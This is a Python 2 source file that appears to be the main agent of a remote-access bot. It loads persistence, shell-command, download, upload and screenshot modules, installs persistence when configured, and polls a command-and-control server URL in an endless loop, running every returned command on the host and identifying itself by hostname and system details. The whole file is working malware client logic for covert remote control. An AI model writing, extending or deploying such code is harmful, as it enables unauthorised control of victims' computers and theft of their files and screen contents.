import time
import os
import requests
import sys
import platform
import socket
import random
import string

import settings
import utils
from modules import runcmd
from modules import persistence
from modules import download
from modules import upload
from modules import screenshot


MODULES = ['runcmd', 'persistence', 'download', 'upload', 'screenshot']
if not settings.BOT_ID:
    settings.BOT_ID = socket.gethostname()
if not utils.validate_botid(settings.BOT_ID):
    settings.BOT_ID = ''.join(random.choice(string.ascii_letters) for _ in range(5))


def print_help(mod=None):
    help_text = "Loaded modules:\n"
    if mod is None:
        for module in MODULES: 
            help_text += "- " + module + "\n"
            help_text += sys.modules["modules." + module].help()
        help_text += """
General commands:

- cd path/to/dir : changes directory
- help : display this text
- [any other command] : execute shell command

"""
    else:
        help_text = "- " + mod + "\n"
        help_text += sys.modules["modules.%s" % mod].help()

    utils.send_output(help_text)


if __name__ == "__main__":
    time.sleep(settings.PAUSE_AT_START)
    if settings.AUTO_PERSIST:
        persistence.install()
    last_active = time.time()
    is_idle = False
    while 1:
        if is_idle:
            time.sleep(settings.REQUEST_INTERVAL * 10)
        else:
            time.sleep(settings.REQUEST_INTERVAL)
        try:
            command = requests.get(settings.SERVER_URL + "/api/pop?botid=" + settings.BOT_ID + "&sysinfo=" + platform.system() + " " + platform.release()).text
            cmdargs = command.split(" ")
            if command:
                if settings.DEBUG:
                    print command
                if cmdargs[0] == "cd":
                    os.chdir(os.path.expandvars(" ".join(cmdargs[1:])))
                elif cmdargs[0] in MODULES:
                    sys.modules["modules.%s" % cmdargs[0]].run(*cmdargs[1:])
                elif cmdargs[0] == "help":
                    if len(cmdargs) > 1:
                        print_help(cmdargs[1])
                    else:
                        print_help()
                else:
                    runcmd.run(command)
                last_active = time.time()
                is_idle = False
            elif time.time() - last_active > settings.IDLE_TIME:
                is_idle = True
        except Exception, exc:
            is_idle = True
            if settings.DEBUG:
                print exc
